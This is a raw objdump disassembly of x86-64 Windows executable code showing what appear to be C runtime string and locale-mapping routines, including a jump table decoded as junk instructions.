   14000b80d:	48 3b c1             	cmp    %rcx,%rax
   14000b810:	41 0f 92 c3          	setb   %r11b
   14000b814:	41 8b c1             	mov    %r9d,%eax
   14000b817:	2b c2                	sub    %edx,%eax
   14000b819:	41 3b c1             	cmp    %r9d,%eax
   14000b81c:	0f 87 cf 00 00 00    	ja     0x14000b8f1
   14000b822:	8b 8c 86 78 ba 00 00 	mov    0xba78(%rsi,%rax,4),%ecx
   14000b829:	48 03 ce             	add    %rsi,%rcx
   14000b82c:	ff e1                	jmp    *%rcx
   14000b82e:	66 0f 73 f9 01       	pslldq $0x1,%xmm1
   14000b833:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   14000b838:	e9 b4 00 00 00       	jmp    0x14000b8f1
   14000b83d:	66 0f 73 f9 02       	pslldq $0x2,%xmm1
   14000b842:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   14000b847:	e9 a5 00 00 00       	jmp    0x14000b8f1
   14000b84c:	66 0f 73 f9 03       	pslldq $0x3,%xmm1
   14000b851:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   14000b856:	e9 96 00 00 00       	jmp    0x14000b8f1
   14000b85b:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   14000b860:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   14000b865:	e9 87 00 00 00       	jmp    0x14000b8f1
   14000b86a:	66 0f 73 f9 05       	pslldq $0x5,%xmm1
   14000b86f:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   14000b874:	eb 7b                	jmp    0x14000b8f1
   14000b876:	66 0f 73 f9 06       	pslldq $0x6,%xmm1
   14000b87b:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   14000b880:	eb 6f                	jmp    0x14000b8f1
   14000b882:	66 0f 73 f9 07       	pslldq $0x7,%xmm1
   14000b887:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   14000b88c:	eb 63                	jmp    0x14000b8f1
   14000b88e:	66 0f 73 f9 08       	pslldq $0x8,%xmm1
   14000b893:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   14000b898:	eb 57                	jmp    0x14000b8f1
   14000b89a:	66 0f 73 f9 09       	pslldq $0x9,%xmm1
   14000b89f:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   14000b8a4:	eb 4b                	jmp    0x14000b8f1
   14000b8a6:	66 0f 73 f9 0a       	pslldq $0xa,%xmm1
   14000b8ab:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   14000b8b0:	eb 3f                	jmp    0x14000b8f1
   14000b8b2:	66 0f 73 f9 0b       	pslldq $0xb,%xmm1
   14000b8b7:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   14000b8bc:	eb 33                	jmp    0x14000b8f1
   14000b8be:	66 0f 73 f9 0c       	pslldq $0xc,%xmm1
   14000b8c3:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   14000b8c8:	eb 27                	jmp    0x14000b8f1
   14000b8ca:	66 0f 73 f9 0d       	pslldq $0xd,%xmm1
   14000b8cf:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   14000b8d4:	eb 1b                	jmp    0x14000b8f1
   14000b8d6:	66 0f 73 f9 0e       	pslldq $0xe,%xmm1
   14000b8db:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   14000b8e0:	eb 0f                	jmp    0x14000b8f1
   14000b8e2:	66 0f 73 f9 0f       	pslldq $0xf,%xmm1
   14000b8e7:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   14000b8ec:	eb 03                	jmp    0x14000b8f1
   14000b8ee:	0f 57 c9             	xorps  %xmm1,%xmm1
   14000b8f1:	45 85 db             	test   %r11d,%r11d
   14000b8f4:	0f 85 e6 00 00 00    	jne    0x14000b9e0
   14000b8fa:	f3 0f 6f 57 10       	movdqu 0x10(%rdi),%xmm2
   14000b8ff:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   14000b903:	66 0f 74 c3          	pcmpeqb %xmm3,%xmm0
   14000b907:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000b90b:	85 c0                	test   %eax,%eax
   14000b90d:	75 35                	jne    0x14000b944
   14000b90f:	48 8b d3             	mov    %rbx,%rdx
   14000b912:	49 8b c8             	mov    %r8,%rcx
   14000b915:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000b91a:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   14000b91f:	5f                   	pop    %rdi
   14000b920:	e9 5f fd ff ff       	jmp    0x14000b684
   14000b925:	4d 85 d2             	test   %r10,%r10
   14000b928:	75 d0                	jne    0x14000b8fa
   14000b92a:	44 38 57 01          	cmp    %r10b,0x1(%rdi)
   14000b92e:	0f 84 ac 00 00 00    	je     0x14000b9e0
   14000b934:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000b939:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   14000b93e:	5f                   	pop    %rdi
   14000b93f:	e9 40 fd ff ff       	jmp    0x14000b684
   14000b944:	0f bc c8             	bsf    %eax,%ecx
   14000b947:	8b c1                	mov    %ecx,%eax
   14000b949:	49 2b c2             	sub    %r10,%rax
   14000b94c:	48 83 c0 10          	add    $0x10,%rax
   14000b950:	48 83 f8 10          	cmp    $0x10,%rax
   14000b954:	77 b9                	ja     0x14000b90f
   14000b956:	44 2b c9             	sub    %ecx,%r9d
   14000b959:	41 83 f9 0f          	cmp    $0xf,%r9d
   14000b95d:	77 79                	ja     0x14000b9d8
   14000b95f:	42 8b 8c 8e b8 ba 00 	mov    0xbab8(%rsi,%r9,4),%ecx
   14000b966:	00 
   14000b967:	48 03 ce             	add    %rsi,%rcx
   14000b96a:	ff e1                	jmp    *%rcx
   14000b96c:	66 0f 73 fa 01       	pslldq $0x1,%xmm2
   14000b971:	eb 65                	jmp    0x14000b9d8
   14000b973:	66 0f 73 fa 02       	pslldq $0x2,%xmm2
   14000b978:	eb 5e                	jmp    0x14000b9d8
   14000b97a:	66 0f 73 fa 03       	pslldq $0x3,%xmm2
   14000b97f:	eb 57                	jmp    0x14000b9d8
   14000b981:	66 0f 73 fa 04       	pslldq $0x4,%xmm2
   14000b986:	eb 50                	jmp    0x14000b9d8
   14000b988:	66 0f 73 fa 05       	pslldq $0x5,%xmm2
   14000b98d:	eb 49                	jmp    0x14000b9d8
   14000b98f:	66 0f 73 fa 06       	pslldq $0x6,%xmm2
   14000b994:	eb 42                	jmp    0x14000b9d8
   14000b996:	66 0f 73 fa 07       	pslldq $0x7,%xmm2
   14000b99b:	eb 3b                	jmp    0x14000b9d8
   14000b99d:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   14000b9a2:	eb 34                	jmp    0x14000b9d8
   14000b9a4:	66 0f 73 fa 09       	pslldq $0x9,%xmm2
   14000b9a9:	eb 2d                	jmp    0x14000b9d8
   14000b9ab:	66 0f 73 fa 0a       	pslldq $0xa,%xmm2
   14000b9b0:	eb 26                	jmp    0x14000b9d8
   14000b9b2:	66 0f 73 fa 0b       	pslldq $0xb,%xmm2
   14000b9b7:	eb 1f                	jmp    0x14000b9d8
   14000b9b9:	66 0f 73 fa 0c       	pslldq $0xc,%xmm2
   14000b9be:	eb 18                	jmp    0x14000b9d8
   14000b9c0:	66 0f 73 fa 0d       	pslldq $0xd,%xmm2
   14000b9c5:	eb 11                	jmp    0x14000b9d8
   14000b9c7:	66 0f 73 fa 0e       	pslldq $0xe,%xmm2
   14000b9cc:	eb 0a                	jmp    0x14000b9d8
   14000b9ce:	66 0f 73 fa 0f       	pslldq $0xf,%xmm2
   14000b9d3:	eb 03                	jmp    0x14000b9d8
   14000b9d5:	0f 57 d2             	xorps  %xmm2,%xmm2
   14000b9d8:	66 0f eb d1          	por    %xmm1,%xmm2
   14000b9dc:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   14000b9e0:	41 0f b6 00          	movzbl (%r8),%eax
   14000b9e4:	84 c0                	test   %al,%al
   14000b9e6:	74 34                	je     0x14000ba1c
   14000b9e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000b9ef:	00 
   14000b9f0:	0f be c0             	movsbl %al,%eax
   14000b9f3:	66 0f 6e c0          	movd   %eax,%xmm0
   14000b9f7:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   14000b9fb:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   14000b9ff:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   14000ba04:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   14000ba08:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000ba0c:	85 c0                	test   %eax,%eax
   14000ba0e:	75 1a                	jne    0x14000ba2a
   14000ba10:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   14000ba15:	49 ff c0             	inc    %r8
   14000ba18:	84 c0                	test   %al,%al
   14000ba1a:	75 d4                	jne    0x14000b9f0
   14000ba1c:	33 c0                	xor    %eax,%eax
   14000ba1e:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000ba23:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   14000ba28:	5f                   	pop    %rdi
   14000ba29:	c3                   	ret
   14000ba2a:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000ba2f:	49 8b c0             	mov    %r8,%rax
   14000ba32:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   14000ba37:	5f                   	pop    %rdi
   14000ba38:	c3                   	ret
   14000ba39:	0f 1f 00             	nopl   (%rax)
   14000ba3c:	72 b7                	jb     0x14000b9f5
   14000ba3e:	00 00                	add    %al,(%rax)
   14000ba40:	79 b7                	jns    0x14000b9f9
   14000ba42:	00 00                	add    %al,(%rax)
   14000ba44:	80 b7 00 00 87 b7 00 	xorb   $0x0,-0x48790000(%rdi)
   14000ba4b:	00 8e b7 00 00 95    	add    %cl,-0x6affff49(%rsi)
   14000ba51:	b7 00                	mov    $0x0,%bh
   14000ba53:	00 9c b7 00 00 a3 b7 	add    %bl,-0x485d0000(%rdi,%rsi,4)
   14000ba5a:	00 00                	add    %al,(%rax)
   14000ba5c:	aa                   	stos   %al,(%rdi)
   14000ba5d:	b7 00                	mov    $0x0,%bh
   14000ba5f:	00 b1 b7 00 00 b8    	add    %dh,-0x47ffff49(%rcx)
   14000ba65:	b7 00                	mov    $0x0,%bh
   14000ba67:	00 bf b7 00 00 c6    	add    %bh,-0x39ffff49(%rdi)
   14000ba6d:	b7 00                	mov    $0x0,%bh
   14000ba6f:	00 cd                	add    %cl,%ch
   14000ba71:	b7 00                	mov    $0x0,%bh
   14000ba73:	00 d4                	add    %dl,%ah
   14000ba75:	b7 00                	mov    $0x0,%bh
   14000ba77:	00 2e                	add    %ch,(%rsi)
   14000ba79:	b8 00 00 3d b8       	mov    $0xb83d0000,%eax
   14000ba7e:	00 00                	add    %al,(%rax)
   14000ba80:	4c b8 00 00 5b b8 00 	rex.WR movabs $0xb86a0000b85b0000,%rax
   14000ba87:	00 6a b8 
   14000ba8a:	00 00                	add    %al,(%rax)
   14000ba8c:	76 b8                	jbe    0x14000ba46
   14000ba8e:	00 00                	add    %al,(%rax)
   14000ba90:	82                   	(bad)
   14000ba91:	b8 00 00 8e b8       	mov    $0xb88e0000,%eax
   14000ba96:	00 00                	add    %al,(%rax)
   14000ba98:	9a                   	(bad)
   14000ba99:	b8 00 00 a6 b8       	mov    $0xb8a60000,%eax
   14000ba9e:	00 00                	add    %al,(%rax)
   14000baa0:	b2 b8                	mov    $0xb8,%dl
   14000baa2:	00 00                	add    %al,(%rax)
   14000baa4:	be b8 00 00 ca       	mov    $0xca0000b8,%esi
   14000baa9:	b8 00 00 d6 b8       	mov    $0xb8d60000,%eax
   14000baae:	00 00                	add    %al,(%rax)
   14000bab0:	e2 b8                	loop   0x14000ba6a
   14000bab2:	00 00                	add    %al,(%rax)
   14000bab4:	ee                   	out    %al,(%dx)
   14000bab5:	b8 00 00 6c b9       	mov    $0xb96c0000,%eax
   14000baba:	00 00                	add    %al,(%rax)
   14000babc:	73 b9                	jae    0x14000ba77
   14000babe:	00 00                	add    %al,(%rax)
   14000bac0:	7a b9                	jp     0x14000ba7b
   14000bac2:	00 00                	add    %al,(%rax)
   14000bac4:	81 b9 00 00 88 b9 00 	cmpl   $0xb98f0000,-0x46780000(%rcx)
   14000bacb:	00 8f b9 
   14000bace:	00 00                	add    %al,(%rax)
   14000bad0:	96                   	xchg   %eax,%esi
   14000bad1:	b9 00 00 9d b9       	mov    $0xb99d0000,%ecx
   14000bad6:	00 00                	add    %al,(%rax)
   14000bad8:	a4                   	movsb  (%rsi),(%rdi)
   14000bad9:	b9 00 00 ab b9       	mov    $0xb9ab0000,%ecx
   14000bade:	00 00                	add    %al,(%rax)
   14000bae0:	b2 b9                	mov    $0xb9,%dl
   14000bae2:	00 00                	add    %al,(%rax)
   14000bae4:	b9 b9 00 00 c0       	mov    $0xc00000b9,%ecx
   14000bae9:	b9 00 00 c7 b9       	mov    $0xb9c70000,%ecx
   14000baee:	00 00                	add    %al,(%rax)
   14000baf0:	ce                   	(bad)
   14000baf1:	b9 00 00 d5 b9       	mov    $0xb9d50000,%ecx
   14000baf6:	00 00                	add    %al,(%rax)
   14000baf8:	45 33 c0             	xor    %r8d,%r8d
   14000bafb:	e9 00 00 00 00       	jmp    0x14000bb00
   14000bb00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000bb05:	57                   	push   %rdi
   14000bb06:	48 83 ec 40          	sub    $0x40,%rsp
   14000bb0a:	48 8b da             	mov    %rdx,%rbx
   14000bb0d:	48 8b f9             	mov    %rcx,%rdi
   14000bb10:	48 85 c9             	test   %rcx,%rcx
   14000bb13:	75 14                	jne    0x14000bb29
   14000bb15:	e8 26 bc ff ff       	call   0x140007740
   14000bb1a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000bb20:	e8 fb ba ff ff       	call   0x140007620
   14000bb25:	33 c0                	xor    %eax,%eax
   14000bb27:	eb 60                	jmp    0x14000bb89
   14000bb29:	48 85 db             	test   %rbx,%rbx
   14000bb2c:	74 e7                	je     0x14000bb15
   14000bb2e:	48 3b fb             	cmp    %rbx,%rdi
   14000bb31:	73 f2                	jae    0x14000bb25
   14000bb33:	49 8b d0             	mov    %r8,%rdx
   14000bb36:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000bb3b:	e8 b0 9c ff ff       	call   0x1400057f0
   14000bb40:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000bb45:	48 8d 53 ff          	lea    -0x1(%rbx),%rdx
   14000bb49:	83 79 08 00          	cmpl   $0x0,0x8(%rcx)
   14000bb4d:	74 24                	je     0x14000bb73
   14000bb4f:	48 ff ca             	dec    %rdx
   14000bb52:	48 3b fa             	cmp    %rdx,%rdi
   14000bb55:	77 0a                	ja     0x14000bb61
   14000bb57:	0f b6 02             	movzbl (%rdx),%eax
   14000bb5a:	f6 44 08 19 04       	testb  $0x4,0x19(%rax,%rcx,1)
   14000bb5f:	75 ee                	jne    0x14000bb4f
   14000bb61:	48 8b cb             	mov    %rbx,%rcx
   14000bb64:	48 2b ca             	sub    %rdx,%rcx
   14000bb67:	48 8b d3             	mov    %rbx,%rdx
   14000bb6a:	83 e1 01             	and    $0x1,%ecx
   14000bb6d:	48 2b d1             	sub    %rcx,%rdx
   14000bb70:	48 ff ca             	dec    %rdx
   14000bb73:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000bb78:	74 0c                	je     0x14000bb86
   14000bb7a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000bb7f:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000bb86:	48 8b c2             	mov    %rdx,%rax
   14000bb89:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000bb8e:	48 83 c4 40          	add    $0x40,%rsp
   14000bb92:	5f                   	pop    %rdi
   14000bb93:	c3                   	ret
   14000bb94:	40 55                	rex push %rbp
   14000bb96:	41 54                	push   %r12
   14000bb98:	41 55                	push   %r13
   14000bb9a:	41 56                	push   %r14
   14000bb9c:	41 57                	push   %r15
   14000bb9e:	48 83 ec 60          	sub    $0x60,%rsp
   14000bba2:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000bba7:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   14000bbab:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   14000bbaf:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   14000bbb3:	48 8b 05 46 e4 00 00 	mov    0xe446(%rip),%rax        # 0x14001a000
   14000bbba:	48 33 c5             	xor    %rbp,%rax
   14000bbbd:	48 89 45 08          	mov    %rax,0x8(%rbp)
   14000bbc1:	48 63 5d 60          	movslq 0x60(%rbp),%rbx
   14000bbc5:	4d 8b f9             	mov    %r9,%r15
   14000bbc8:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   14000bbcc:	45 8b e8             	mov    %r8d,%r13d
   14000bbcf:	48 8b f9             	mov    %rcx,%rdi
   14000bbd2:	85 db                	test   %ebx,%ebx
   14000bbd4:	7e 14                	jle    0x14000bbea
   14000bbd6:	48 8b d3             	mov    %rbx,%rdx
   14000bbd9:	49 8b c9             	mov    %r9,%rcx
   14000bbdc:	e8 f3 14 00 00       	call   0x14000d0d4
   14000bbe1:	3b c3                	cmp    %ebx,%eax
   14000bbe3:	8d 58 01             	lea    0x1(%rax),%ebx
   14000bbe6:	7c 02                	jl     0x14000bbea
   14000bbe8:	8b d8                	mov    %eax,%ebx
   14000bbea:	44 8b 75 78          	mov    0x78(%rbp),%r14d
   14000bbee:	45 85 f6             	test   %r14d,%r14d
   14000bbf1:	75 07                	jne    0x14000bbfa
   14000bbf3:	48 8b 07             	mov    (%rdi),%rax
   14000bbf6:	44 8b 70 0c          	mov    0xc(%rax),%r14d
   14000bbfa:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   14000bc00:	44 8b cb             	mov    %ebx,%r9d
   14000bc03:	4d 8b c7             	mov    %r15,%r8
   14000bc06:	41 8b ce             	mov    %r14d,%ecx
   14000bc09:	1b d2                	sbb    %edx,%edx
   14000bc0b:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000bc10:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000bc16:	83 e2 08             	and    $0x8,%edx
   14000bc19:	ff c2                	inc    %edx
   14000bc1b:	e8 4c da ff ff       	call   0x14000966c
   14000bc20:	4c 63 e0             	movslq %eax,%r12
   14000bc23:	85 c0                	test   %eax,%eax
   14000bc25:	0f 84 36 02 00 00    	je     0x14000be61
   14000bc2b:	49 8b c4             	mov    %r12,%rax
   14000bc2e:	49 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r8
   14000bc35:	ff ff 0f 
   14000bc38:	48 03 c0             	add    %rax,%rax
   14000bc3b:	48 8d 48 10          	lea    0x10(%rax),%rcx
   14000bc3f:	48 3b c1             	cmp    %rcx,%rax
   14000bc42:	48 1b d2             	sbb    %rdx,%rdx
   14000bc45:	48 23 d1             	and    %rcx,%rdx
   14000bc48:	74 53                	je     0x14000bc9d
   14000bc4a:	48 81 fa 00 04 00 00 	cmp    $0x400,%rdx
   14000bc51:	77 2e                	ja     0x14000bc81
   14000bc53:	48 8d 42 0f          	lea    0xf(%rdx),%rax
   14000bc57:	48 3b c2             	cmp    %rdx,%rax
   14000bc5a:	77 03                	ja     0x14000bc5f
   14000bc5c:	49 8b c0             	mov    %r8,%rax
   14000bc5f:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000bc63:	e8 78 2a 00 00       	call   0x14000e6e0
   14000bc68:	48 2b e0             	sub    %rax,%rsp
   14000bc6b:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
   14000bc70:	48 85 f6             	test   %rsi,%rsi
   14000bc73:	0f 84 ce 01 00 00    	je     0x14000be47
   14000bc79:	c7 06 cc cc 00 00    	movl   $0xcccc,(%rsi)
   14000bc7f:	eb 16                	jmp    0x14000bc97
   14000bc81:	48 8b ca             	mov    %rdx,%rcx
   14000bc84:	e8 bf c1 ff ff       	call   0x140007e48
   14000bc89:	48 8b f0             	mov    %rax,%rsi
   14000bc8c:	48 85 c0             	test   %rax,%rax
   14000bc8f:	74 0e                	je     0x14000bc9f
   14000bc91:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000bc97:	48 83 c6 10          	add    $0x10,%rsi
   14000bc9b:	eb 02                	jmp    0x14000bc9f
   14000bc9d:	33 f6                	xor    %esi,%esi
   14000bc9f:	48 85 f6             	test   %rsi,%rsi
   14000bca2:	0f 84 9f 01 00 00    	je     0x14000be47
   14000bca8:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000bcad:	44 8b cb             	mov    %ebx,%r9d
   14000bcb0:	4d 8b c7             	mov    %r15,%r8
   14000bcb3:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000bcb8:	ba 01 00 00 00       	mov    $0x1,%edx
   14000bcbd:	41 8b ce             	mov    %r14d,%ecx
   14000bcc0:	e8 a7 d9 ff ff       	call   0x14000966c
   14000bcc5:	85 c0                	test   %eax,%eax
   14000bcc7:	0f 84 7a 01 00 00    	je     0x14000be47
   14000bccd:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000bcd3:	45 8b cc             	mov    %r12d,%r9d
   14000bcd6:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000bcdc:	4c 8b c6             	mov    %rsi,%r8
   14000bcdf:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000bce5:	41 8b d5             	mov    %r13d,%edx
   14000bce8:	4c 8b 7d 00          	mov    0x0(%rbp),%r15
   14000bcec:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000bcf1:	49 8b cf             	mov    %r15,%rcx
   14000bcf4:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000bcfa:	e8 55 be ff ff       	call   0x140007b54
   14000bcff:	48 63 f8             	movslq %eax,%rdi
   14000bd02:	85 c0                	test   %eax,%eax
   14000bd04:	0f 84 3d 01 00 00    	je     0x14000be47
   14000bd0a:	ba 00 04 00 00       	mov    $0x400,%edx
   14000bd0f:	44 85 ea             	test   %r13d,%edx
   14000bd12:	74 52                	je     0x14000bd66
   14000bd14:	8b 45 70             	mov    0x70(%rbp),%eax
   14000bd17:	85 c0                	test   %eax,%eax
   14000bd19:	0f 84 2a 01 00 00    	je     0x14000be49
   14000bd1f:	3b f8                	cmp    %eax,%edi
   14000bd21:	0f 8f 20 01 00 00    	jg     0x14000be47
   14000bd27:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000bd2d:	45 8b cc             	mov    %r12d,%r9d
   14000bd30:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000bd36:	4c 8b c6             	mov    %rsi,%r8
   14000bd39:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000bd3f:	41 8b d5             	mov    %r13d,%edx
   14000bd42:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000bd46:	49 8b cf             	mov    %r15,%rcx
   14000bd49:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000bd4d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000bd52:	e8 fd bd ff ff       	call   0x140007b54
   14000bd57:	8b f8                	mov    %eax,%edi
   14000bd59:	85 c0                	test   %eax,%eax
   14000bd5b:	0f 85 e8 00 00 00    	jne    0x14000be49
   14000bd61:	e9 e1 00 00 00       	jmp    0x14000be47
   14000bd66:	48 8b cf             	mov    %rdi,%rcx
   14000bd69:	48 03 c9             	add    %rcx,%rcx
   14000bd6c:	48 8d 41 10          	lea    0x10(%rcx),%rax
   14000bd70:	48 3b c8             	cmp    %rax,%rcx
   14000bd73:	48 1b c9             	sbb    %rcx,%rcx
   14000bd76:	48 23 c8             	and    %rax,%rcx
   14000bd79:	74 53                	je     0x14000bdce
   14000bd7b:	48 3b ca             	cmp    %rdx,%rcx
   14000bd7e:	77 35                	ja     0x14000bdb5
   14000bd80:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000bd84:	48 3b c1             	cmp    %rcx,%rax
   14000bd87:	77 0a                	ja     0x14000bd93
   14000bd89:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000bd90:	ff ff 0f 
   14000bd93:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000bd97:	e8 44 29 00 00       	call   0x14000e6e0
   14000bd9c:	48 2b e0             	sub    %rax,%rsp
   14000bd9f:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   14000bda4:	48 85 db             	test   %rbx,%rbx
   14000bda7:	0f 84 9a 00 00 00    	je     0x14000be47
   14000bdad:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000bdb3:	eb 13                	jmp    0x14000bdc8
   14000bdb5:	e8 8e c0 ff ff       	call   0x140007e48
   14000bdba:	48 8b d8             	mov    %rax,%rbx
   14000bdbd:	48 85 c0             	test   %rax,%rax
   14000bdc0:	74 0e                	je     0x14000bdd0
   14000bdc2:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000bdc8:	48 83 c3 10          	add    $0x10,%rbx
   14000bdcc:	eb 02                	jmp    0x14000bdd0
   14000bdce:	33 db                	xor    %ebx,%ebx
   14000bdd0:	48 85 db             	test   %rbx,%rbx
   14000bdd3:	74 72                	je     0x14000be47
   14000bdd5:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000bddb:	45 8b cc             	mov    %r12d,%r9d
   14000bdde:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000bde4:	4c 8b c6             	mov    %rsi,%r8
   14000bde7:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000bded:	41 8b d5             	mov    %r13d,%edx
   14000bdf0:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   14000bdf4:	49 8b cf             	mov    %r15,%rcx
   14000bdf7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000bdfc:	e8 53 bd ff ff       	call   0x140007b54
   14000be01:	85 c0                	test   %eax,%eax
   14000be03:	74 31                	je     0x14000be36
   14000be05:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000be0b:	33 d2                	xor    %edx,%edx
   14000be0d:	48 21 54 24 30       	and    %rdx,0x30(%rsp)
   14000be12:	44 8b cf             	mov    %edi,%r9d
   14000be15:	8b 45 70             	mov    0x70(%rbp),%eax
   14000be18:	4c 8b c3             	mov    %rbx,%r8
   14000be1b:	41 8b ce             	mov    %r14d,%ecx
   14000be1e:	85 c0                	test   %eax,%eax
   14000be20:	75 65                	jne    0x14000be87
   14000be22:	21 54 24 28          	and    %edx,0x28(%rsp)
   14000be26:	48 21 54 24 20       	and    %rdx,0x20(%rsp)
   14000be2b:	e8 98 d8 ff ff       	call   0x1400096c8
   14000be30:	8b f8                	mov    %eax,%edi
   14000be32:	85 c0                	test   %eax,%eax
   14000be34:	75 60                	jne    0x14000be96
   14000be36:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000be3a:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000be40:	75 05                	jne    0x14000be47
   14000be42:	e8 d9 c0 ff ff       	call   0x140007f20
   14000be47:	33 ff                	xor    %edi,%edi
   14000be49:	48 85 f6             	test   %rsi,%rsi
   14000be4c:	74 11                	je     0x14000be5f
   14000be4e:	48 8d 4e f0          	lea    -0x10(%rsi),%rcx
   14000be52:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000be58:	75 05                	jne    0x14000be5f
   14000be5a:	e8 c1 c0 ff ff       	call   0x140007f20
   14000be5f:	8b c7                	mov    %edi,%eax
   14000be61:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   14000be65:	48 33 cd             	xor    %rbp,%rcx
   14000be68:	e8 c3 72 ff ff       	call   0x140003130
   14000be6d:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   14000be71:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   14000be75:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   14000be79:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   14000be7d:	41 5f                	pop    %r15
   14000be7f:	41 5e                	pop    %r14
   14000be81:	41 5d                	pop    %r13
   14000be83:	41 5c                	pop    %r12
   14000be85:	5d                   	pop    %rbp
   14000be86:	c3                   	ret
   14000be87:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000be8b:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000be8f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000be94:	eb 95                	jmp    0x14000be2b
   14000be96:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000be9a:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000bea0:	75 a7                	jne    0x14000be49
   14000bea2:	e8 79 c0 ff ff       	call   0x140007f20
   14000bea7:	eb a0                	jmp    0x14000be49
   14000bea9:	cc                   	int3
   14000beaa:	cc                   	int3
   14000beab:	cc                   	int3
   14000beac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000beb1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000beb6:	57                   	push   %rdi
   14000beb7:	48 83 ec 70          	sub    $0x70,%rsp
   14000bebb:	48 8b f2             	mov    %rdx,%rsi
   14000bebe:	49 8b d9             	mov    %r9,%rbx
   14000bec1:	48 8b d1             	mov    %rcx,%rdx
   14000bec4:	41 8b f8             	mov    %r8d,%edi
